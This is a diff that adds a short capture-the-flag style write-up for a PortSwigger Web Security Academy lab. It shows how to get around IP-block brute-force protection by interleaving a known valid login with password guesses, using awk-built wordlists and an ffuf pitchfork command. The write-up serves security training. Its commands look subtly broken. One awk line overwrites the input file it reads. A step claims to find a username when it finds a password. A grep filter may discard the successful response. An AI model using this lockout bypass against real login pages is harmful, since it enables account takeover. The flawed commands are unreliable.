@@ -1,0 +1,23 @@
+# url
+https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
+# objective
+Login to the web app after brute forcing a valid password. There is a bruteforce protection in place where your IP will be blocked after 3 incorrect attempts. So we need to alternate between a valid credentials and our password bruteforcing. 
+# method of solve
+1) Use the Burp Suite browser and login to the app via the My Account link with the credentials `wiener:peter`.
+2) Locate the POST request in the Burp Suite HTTP History tab
+3) Save the request by right-clicking and selecting "copy to file", saving the file as `request.txt`
+4) Modify the request.txt file contents, setting the username value to `FUZZ_USER`, and the password value to `FUZZ_PASS`
+5) Create a custom password list from the default passwords.txt file
+```
+awk '{print "peter"; print}' passwords.txt > passwords.txt
+```
+6) Create a custom usernames list with wiener and carlos repeated 200 times (the same number of lines as the password.txt file)
+```
+seq 1 100 | awk '{print "wiener"; print "carlos"}' > usernames.txt
+```
+7) Use Ffuf to determine a valid username. In this example, we need to use a pitchfork attack which matches each entry on the username and password files. We also need to filter on all of the unsuccessful status codes
+```
+ffuf -request request.txt -w usernames.txt:FUZZ_USER -w passwords.txt:FUZZ_PASS -mode pitchfork -rate 3 -fc 200 | grep -v "FUZZ_USER: wiener" | grep -v "FUZZ_PASS: peter" | grep -v "Status: 302"
+```
+8) Note that only one request is returned. Use this password to login as the `carlos` user.
+> Finis
